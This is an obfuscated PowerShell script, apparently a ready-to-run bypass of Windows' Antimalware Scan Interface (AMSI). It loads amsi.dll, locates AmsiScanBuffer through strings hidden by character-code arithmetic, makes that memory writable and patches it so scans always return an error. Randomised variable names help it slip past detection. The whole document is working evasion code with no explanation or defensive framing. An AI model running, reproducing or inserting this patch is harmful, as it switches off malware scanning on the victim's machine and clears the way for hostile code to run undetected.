$K7_vYfTltFsJvC08w = @"
using System;
using System.Runtime.InteropServices;
public class K7_vYfTltFsJvC08w {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr FJBCGGTT22QX64ncw, string knVTNXExB22);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr w4OJs8mm4Fb6CpRdI9, UIntPtr SuyGkzI9Y61_5WlQGy, uint iVDYYN4xwHFEnj9zf, out uint oUbolC4f33g85QSs);
}
"@

Add-Type $K7_vYfTltFsJvC08w

$uUUE69V2FjG = [K7_vYfTltFsJvC08w]::LoadLibrary("$(('á'+'m'+'s'+'ì'+'.'+'d'+'l'+'l').NORMAlizE([cHAr](70)+[chaR]([byte]0x6f)+[char]([ByTE]0x72)+[CHaR](109*22/22)+[CHar]([BYTe]0x44)) -replace [CHar](92)+[ChaR]([ByTe]0x70)+[cHar](123*3/3)+[CHaR]([BYtE]0x4d)+[CHaR](110+6-6)+[cHAR](125))")
$Syzr4aqQ = [K7_vYfTltFsJvC08w]::GetProcAddress($uUUE69V2FjG, "$([ChAR]([bYtE]0x41)+[char](109)+[cHAR]([bYTe]0x73)+[CHaR]([byTE]0x69)+[ChaR]([BYtE]0x53)+[Char](99)+[cHAr]([byte]0x61)+[ChAr]([BytE]0x6e)+[CHar](13+53)+[Char]([ByTe]0x75)+[cHar](70+32)+[CHar](102*52/52)+[cHar](101+32-32)+[CHaR]([BYtE]0x72))")
$p = 0
[K7_vYfTltFsJvC08w]::VirtualProtect($Syzr4aqQ, [uint32]5, 0x40, [ref]$p)
$be4WelAo4W2RljvYWU = "0xB8"
$QXAX = "0x57"
$qaRGdy0 = "0x00"
$y1tqnSvquhYrIPmDY4t = "0x07"
$iOI15r3CvL1lDc = "0x80"
$hmD50r92lAh = "0xC3"
$I57l = [Byte[]] ($be4WelAo4W2RljvYWU,$QXAX,$qaRGdy0,$y1tqnSvquhYrIPmDY4t,+$iOI15r3CvL1lDc,+$hmD50r92lAh)
[System.Runtime.InteropServices.Marshal]::Copy($I57l, 0, $Syzr4aqQ, 6)